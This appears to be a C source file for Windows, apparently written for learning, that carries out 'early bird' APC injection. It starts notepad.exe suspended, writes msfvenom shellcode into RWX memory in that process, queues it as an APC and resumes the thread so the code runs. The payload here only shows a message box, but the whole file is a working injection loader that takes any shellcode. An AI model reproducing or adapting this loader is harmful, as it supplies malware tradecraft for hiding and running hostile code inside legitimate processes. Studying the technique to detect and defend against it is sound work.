#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>


// implement early bird injection using APC injection technique on a newly created process in suspended mode.
#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)

//  msfvenom -p windows/x64/messagebox TEXT="hireme" TITLE="i love malware" -f c -v shellcode
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d"
"\x31\xc9\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
"\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
"\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50\x49"
"\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x07"
"\x00\x00\x00\x68\x69\x72\x65\x6d\x65\x00\x5a\xe8\x0f\x00"
"\x00\x00\x69\x20\x6c\x6f\x76\x65\x20\x6d\x61\x6c\x77\x61"
"\x72\x65\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56\x07"
"\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5";

BOOL CreateRemoteProcessDebug(IN LPWSTR szProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi = { 0 };
	if (!CreateProcess(szProcessName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		error("CreateProcess Failed With Error : %d", GetLastError());
		return FALSE;
	}
	okay("Created a new process \"%ls\" in debug mode with PID: %d, PRESS ENTER", szProcessName, pi.dwProcessId);
	getchar();
	*hProcess = pi.hProcess;
	*hThread = pi.hThread;
	return TRUE;
}

BOOL GetRemoteThreadHandle(IN HANDLE hProcess, OUT HANDLE* hThread) {
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		error("CreateToolhelp32Snapshot Failed With Error : %d", GetLastError());
		return FALSE;
	}

	THREADENTRY32 Thrd = { .dwSize = sizeof(THREADENTRY32) };
	while (Thread32Next(hSnapShot, &Thrd)) {
		if (Thrd.th32OwnerProcessID == GetProcessId(hProcess)) {
			okay("Thread found with TID: %d within the targeted process, PRESS ENTER", Thrd.th32ThreadID);
			getchar();
			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thrd.th32ThreadID);
			if (*hThread == NULL) {
				error("OpenThread Failed With Error : %d", GetLastError());
				CloseHandle(hSnapShot);
				return FALSE;
			}
			CloseHandle(hSnapShot);
			return TRUE;
		}
	}
	CloseHandle(hSnapShot);
	info("No thread found for process. bad luck");
	return FALSE;
}

BOOL QueueEarlyBirdAPCInjection(IN HANDLE hProcess, IN HANDLE hThread, IN LPVOID lpPayload, IN SIZE_T dwSize) {
	LPVOID lpRemoteMem = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // RWX i know i know
	if (lpRemoteMem == NULL) {
		error("VirtualAllocEx Failed With Error : %d", GetLastError());
		return FALSE;
	}
	info("Allocated Memory in Remote Process at Address: %p, PRESS ENTER", lpRemoteMem);
	getchar();

	if (!WriteProcessMemory(hProcess, lpRemoteMem, lpPayload, dwSize, NULL)) {
		error("WriteProcessMemory Failed With Error : %d", GetLastError());
		VirtualFreeEx(hProcess, lpRemoteMem, 0, MEM_RELEASE);
		return FALSE;
	}
	info("Payload Written Successfully to Remote Process Memory at Address: %p, PRESS ENTER", lpRemoteMem);
	getchar();

	if (!QueueUserAPC((PAPCFUNC)lpRemoteMem, hThread, 0)) {
		error("QueueUserAPC Failed With Error : %d", GetLastError());
		VirtualFreeEx(hProcess, lpRemoteMem, 0, MEM_RELEASE);
		return FALSE;
	}



	okay("Payload Queued Successfully, PRESS ENTER");
	getchar();

	return TRUE;
}

int main(int argc, char** argv) {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	CreateRemoteProcessDebug(L"C:\\Windows\\System32\\notepad.exe", &hProcess, &hThread);
	info("Process created in debug mode. PID: %d.  PRESS ENTER", GetProcessId(hProcess));
	getchar();

	GetRemoteThreadHandle(hProcess, &hThread);

	QueueEarlyBirdAPCInjection(hProcess, hThread, shellcode, sizeof(shellcode));

	info("APC Injection Queued. Resuming the thread to trigger the payload. PRESS ENTER");
	getchar();



	ResumeThread(hThread);
	info("Thread Resumed. Waiting for the thread to finish execution.");
	WaitForSingleObject(hThread, INFINITE);


	okay("Done! Press <Enter> to quit.");
	getchar();
	return 0;
}
